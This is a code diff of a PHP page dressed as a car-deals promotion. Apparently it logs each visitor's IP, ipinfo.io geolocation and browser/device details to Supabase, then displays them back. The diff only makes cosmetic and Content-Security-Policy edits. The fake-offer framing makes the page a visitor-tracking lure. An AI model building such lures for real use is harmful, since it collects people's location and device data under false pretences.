@@ -6,13 +6,14 @@ if (file_exists(__DIR__ . '/.env')) {
     $dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
     $dotenv->load();
 }
+
 // Captura o IP real do visitante no Vercel
 $visitor_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
 if (strpos($visitor_ip, ',') !== false) {
-    // Se houver múltiplos IPs no X-Forwarded-For, pega o primeiro (IP do cliente)
     $visitor_ip = explode(',', $visitor_ip)[0];
 }
-$visitor_ip = trim($visitor_ip); // Remove espaços
+$visitor_ip = trim($visitor_ip);
+
 // Faz a requisição ao ipinfo.io com depuração
 $ipinfo_token = getenv('IPINFO_TOKEN');
 $ipinfo_url = "https://ipinfo.io/{$visitor_ip}?token={$ipinfo_token}";
@@ -53,8 +54,6 @@ $result = db_query('visitors', $visitor_info, 'POST');
 if (isset($result['error'])) {
     error_log("Erro ao salvar no Supabase: " . json_encode($result));
 }
-
-
 ?>
 
 <!DOCTYPE html>
@@ -62,10 +61,10 @@ if (isset($result['error'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; script-src-elem 'self' https://cdnjs.cloudflare.com; script-src-attr 'unsafe-inline'; connect-src 'self' https://*.vercel.app">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; script-src-elem 'self' https://cdnjs.cloudflare.com; script-src-attr 'unsafe-inline'; connect-src 'self' https://*.vercel.app; style-src 'self' 'unsafe-inline'">
     <title>Ultimate Car Deals - Unlock Exclusive Offers</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ua-parser-js/1.0.2/ua-parser.min.js"></script>
-  <style>
+    <style>
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(to bottom, #1a1a1a, #4d4d4d);
@@ -124,15 +123,15 @@ if (isset($result['error'])) {
             font-size: 0.9em;
             color: #ccc;
         }
-  </style>
+    </style>
 </head>
 <body>
     <header>
         <h1>Ultimate Car Deals</h1>
-        <p>Discover exclusive offers on the hottest cars – just for you!</p>
+        <p class="intro">Discover exclusive offers on the hottest cars – just for you!</p>
         <button onclick="alert('Check your info below to claim your deal!')">Claim Your Offer</button>
     </header>
-    <div>
+    <div class="info-box">
         <h2>Your Details</h2>
         <pre id="info"><?php echo json_encode($visitor_info, JSON_PRETTY_PRINT); ?></pre>
     </div>
@@ -151,7 +150,7 @@ if (isset($result['error'])) {
         visitorInfo.device_type = result.device.type || "Unknown";
         document.getElementById('info').innerHTML = JSON.stringify(visitorInfo, null, 2);
 
-        fetch('/update_visitor.php', {  // URL relativa, ajustada para Vercel
+        fetch('/update_visitor.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(visitorInfo)
